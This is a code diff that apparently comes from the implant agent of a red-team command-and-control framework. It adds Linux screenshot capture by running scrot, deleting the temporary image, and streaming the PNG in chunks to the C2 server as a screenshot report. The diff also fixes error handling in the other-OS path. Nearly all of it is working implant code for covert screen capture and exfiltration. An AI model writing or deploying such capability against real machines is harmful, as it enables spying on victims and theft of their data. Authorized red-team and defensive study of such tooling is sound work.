@@ -14,6 +14,19 @@ use {
     xcap::Monitor,
 };
 
+#[cfg(target_os = "linux")]
+use {
+    alloc::format,
+    alloc::string::{String, ToString},
+    alloc::vec::Vec,
+    pb::c2::report_file_request,
+    pb::{c2, eldritch},
+    std::process::Command,
+    std::sync::Mutex,
+    std::env::temp_dir,
+    std::path::PathBuf,
+};
+
 #[cfg(all(unix, feature = "stdlib"))]
 fn get_hostname() -> String {
     nix::unistd::gethostname()
@@ -38,9 +51,113 @@ fn get_hostname() -> String {
 
 #[cfg(target_os = "linux")]
 pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String> {
-    return Err(
-        "This OS isn't supported by the screenshot function.\nOnly windows and mac systems are supported".to_string()
-    );
+    let hostname = get_hostname();
+    let timestamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+
+    let uuid = uuid::Uuid::new_v4().to_string();
+    let mut temp_file = temp_dir();
+    temp_file.push(format!("imix_screenshot_{}.png", uuid));
+
+    let temp_file_str = temp_file.to_string_lossy().to_string();
+
+    // Try to take a screenshot using scrot
+    let status = Command::new("scrot")
+        .arg(&temp_file_str)
+        .status()
+        .map_err(|e| format!("Failed to execute scrot: {}", e))?;
+
+    if !status.success() {
+        return Err(format!("scrot failed with status: {}", status));
+    }
+
+    let png_data = std::fs::read(&temp_file_str).map_err(|e| format!("Failed to read screenshot file: {}", e))?;
+
+    // Clean up
+    let _ = std::fs::remove_file(&temp_file_str);
+
+    let filename = format!("screenshot_{}_{}_0.png", hostname, timestamp);
+
+    // Prepare context
+    let context_val = match context {
+        Context::Task(ref tc) => Some(report_file_request::Context::TaskContext(tc.clone())),
+        Context::ShellTask(ref stc) => {
+            Some(report_file_request::Context::ShellTaskContext(stc.clone()))
+        }
+    };
+
+    // Error handling for the streaming thread
+    let error: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
+    let error_clone = error.clone();
+
+    // Use a sync channel with bound 1 to provide backpressure
+    let (tx, rx) = std::sync::mpsc::sync_channel(1);
+
+    let chunk_size = 1024 * 1024; // 1MB
+    let total_size = png_data.len();
+
+    let png_data_clone = png_data.clone();
+    let filename_clone = filename.clone();
+    let context_val_clone = context_val.clone();
+
+    // Spawn thread for streaming
+    std::thread::spawn(move || {
+        let mut offset = 0;
+        let mut metadata_sent = false;
+
+        loop {
+            if offset >= total_size {
+                break;
+            }
+
+            let end = std::cmp::min(offset + chunk_size, total_size);
+            let chunk_data = png_data_clone[offset..end].to_vec();
+
+            let metadata = if !metadata_sent {
+                metadata_sent = true;
+                Some(eldritch::FileMetadata {
+                    path: filename_clone.clone(),
+                    permissions: "644".to_string(),
+                    owner: "root".to_string(),
+                    group: "root".to_string(),
+                    size: total_size as u64,
+                    ..Default::default()
+                })
+            } else {
+                None
+            };
+
+            let file_msg = eldritch::File {
+                metadata,
+                chunk: chunk_data,
+            };
+
+            let req = c2::ReportFileRequest {
+                context: context_val_clone.clone(),
+                chunk: Some(file_msg),
+                kind: c2::ReportFileKind::Screenshot as i32,
+            };
+
+            if tx.send(req).is_err() {
+                let mut err = error_clone.lock().unwrap();
+                *err = Some("Failed to send chunk through channel".to_string());
+                break;
+            }
+
+            offset += chunk_size;
+        }
+    });
+
+    // Send stream to agent (blocking)
+    agent.report_file(rx).map(|_| ())?;
+
+    if let Some(e) = error.lock().unwrap().as_ref() {
+        return Err(e.clone());
+    }
+
+    Ok(())
 }
 
 #[cfg(not(target_os = "linux"))]
@@ -81,6 +198,7 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
 
         // Error handling for the streaming thread
         let error: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
+        let error_clone = error.clone();
 
         // Use a sync channel with bound 1 to provide backpressure
         let (tx, rx) = std::sync::mpsc::sync_channel(1);
@@ -131,6 +249,8 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
                 };
 
                 if tx.send(req).is_err() {
+                    let mut err = error_clone.lock().unwrap();
+                    *err = Some("Failed to send chunk through channel".to_string());
                     break;
                 }
 
